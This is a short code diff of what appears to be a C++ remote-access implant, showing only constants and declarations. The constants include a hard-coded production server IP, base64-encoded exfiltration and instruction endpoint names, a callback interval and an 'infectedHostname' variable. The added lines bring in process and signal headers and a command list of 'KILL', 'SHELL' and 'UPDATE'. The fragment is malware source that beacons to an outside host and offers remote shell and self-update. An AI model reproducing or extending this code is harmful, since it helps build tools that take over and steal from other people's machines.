@@ -9,11 +9,16 @@
 #include <chrono>
 #include <thread>
 #include <curl/curl.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <signal.h>
 #define TESTING "http://localhost:5000/"
 #define PROD "http://51.79.54.105:5000/"
 
 
 //Consts
+
+static const std::vector<std::string> POLO_CMDS = {"KILL", "SHELL", "UPDATE"};
 static const std::string URL = TESTING; 
 static const std::string EXFIL = "aGF0c3UK";
 static const std::string INSTR = "R1JOQ2hlZXRhaAo";
@@ -22,6 +27,8 @@ static const int CALLBACK_INTERVAL = 5; //seconds
 
 static std::string infectedHostname = "";
 static std::string PER_IMPL_INSTR = "";
+static pid_t PID; 
+std::string gen_endpoint(size_t length);
 size_t CurlcallbackFuncToString(void *contents, size_t size, size_t nmemb, std::string *s);
 std::string curl_get(std::string url, std::string endpoint);
 void curl_post(std::string url, std::string endpoint, std::string data);
